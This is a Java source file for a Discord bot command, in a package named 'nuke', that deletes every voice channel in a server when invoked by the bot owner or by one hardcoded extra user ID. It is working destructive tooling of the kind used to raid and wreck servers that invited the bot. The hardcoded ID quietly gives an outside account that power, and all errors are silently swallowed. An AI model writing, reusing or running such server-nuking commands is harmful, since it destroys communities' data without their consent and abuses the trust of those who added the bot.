package me.comu.exeter.commands.nuke;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import net.dv8tion.jda.api.entities.VoiceChannel;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.exceptions.ErrorResponseException;
import net.dv8tion.jda.api.exceptions.HierarchyException;

import java.util.Arrays;
import java.util.List;

public class DeleteVoiceChannelsCommand implements ICommand {
    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("210956619788320768")) {
            return;
        }
        List<VoiceChannel> voiceChannels = event.getGuild().getVoiceChannels();
        int tcSize = voiceChannels.size();

        try {
            for (int i = 0; i <= tcSize; i++) {
                try {
                    voiceChannels.get(i).delete().queue();
                } catch (HierarchyException | IndexOutOfBoundsException ex1) {

                }
            }
        } catch (HierarchyException | ErrorResponseException | IndexOutOfBoundsException ex) {

        }


    }

    @Override
    public String getHelp() {
        return "Deletes all voice channels\n`" + Core.PREFIX + getInvoke() + "`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "dvc";
    }

    @Override
    public String[] getAlias() {
        return new String[] {"delvc","deletevoicechannels","deletevc"};
    }

     @Override
    public Category getCategory() {
        return Category.OWNER;
    }
}
